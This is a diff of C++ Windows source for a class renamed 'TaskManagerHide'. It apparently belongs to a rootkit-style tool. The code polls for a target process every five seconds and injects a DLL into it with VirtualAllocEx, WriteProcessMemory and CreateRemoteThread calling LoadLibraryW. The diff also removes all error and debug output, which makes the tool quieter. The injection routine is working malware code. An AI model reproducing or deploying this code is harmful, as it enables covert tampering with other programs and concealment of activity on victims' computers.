@@ -1,16 +1,19 @@
 #include "TaskManager.h"
 
-DWORD WINAPI MyThreadFunction(LPVOID lpParam);
-
-DWORD WINAPI MyThreadFunction(LPVOID lpParam)
+/*
+the function run in loop findProcess
+*/
+DWORD WINAPI ProcessFindingLoop(LPVOID lpParam)
 {
+	TaskManagerHide* taskManager = (TaskManagerHide*)lpParam;
 	while (1)
 	{
-		taskManager.findProcess(INJECT_INTO);
+		taskManager->findProcess(INJECT_INTO);
+		Sleep(5000);
 	}
 }
 
-void TaskManager::findProcess(const char* name)
+void TaskManagerHide::findProcess(const char* name)
 {
 	HANDLE hProcess = NULL;
 	int retValue = 0;
@@ -32,7 +35,6 @@ void TaskManager::findProcess(const char* name)
 			if (hProcess)
 			{
 				injectProcess(hProcess);
-				std::cout << hProcess << std::endl;
 			}
 		}
 		// go to next process
@@ -41,20 +43,20 @@ void TaskManager::findProcess(const char* name)
 	CloseHandle(hSnapShot);
 }
 
-void TaskManager::start()
+void TaskManagerHide::start()
 {
 	//create thread of findProcess
 	DWORD threadId;
 	this->_thread = CreateThread(
 		NULL,                   // default security attributes
 		0,                      // use default stack size  
-		MyThreadFunction,       // thread function name
-		0,          // argument to thread function 
+		ProcessFindingLoop,       // thread function name
+		this,          // argument to thread function 
 		0,                      // use default creation flags 
 		&threadId);   // returns the thread identifier 	
 }
 
-void TaskManager::injectProcess(HANDLE process)
+void TaskManagerHide::injectProcess(HANDLE process)
 {
 	// Get full path of DLL to inject
 	wchar_t dllPath[MAX_PATH] = { 0 };
@@ -64,14 +66,12 @@ void TaskManager::injectProcess(HANDLE process)
 	PVOID addrLoadLibrary = (PVOID)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryW");
 	if (addrLoadLibrary == NULL)
 	{
-		std::cout << "Error getting dll function address: " << GetLastError();
 		return;
 	}
 
 	// Open remote process
 	if (process == NULL)
 	{
-		std::cout << "process wasn't found";
 		return;
 	}
 	// Get a pointer to memory location in remote process,
@@ -79,14 +79,12 @@ void TaskManager::injectProcess(HANDLE process)
 	PVOID memAddr = (PVOID)VirtualAllocEx(process, NULL, pathLen * sizeof(wchar_t), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (NULL == memAddr)
 	{
-		std::cout << "Error allocating memory: " << GetLastError();
 		return;
 	}
 	// Write DLL name to remote process memory
 	BOOL check = WriteProcessMemory(process, memAddr, dllPath, pathLen * sizeof(wchar_t), NULL);
 	if (0 == check)
 	{
-		std::cout << "Error writing to memory: " << GetLastError();
 		return;
 	}
 	// Open remote thread, while executing LoadLibrary
@@ -94,7 +92,6 @@ void TaskManager::injectProcess(HANDLE process)
 	HANDLE hRemote = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)addrLoadLibrary, memAddr, 0, NULL);
 	if (NULL == hRemote)
 	{
-		std::cout << "Error creating thread: " << GetLastError();
 		return;
 	}
 
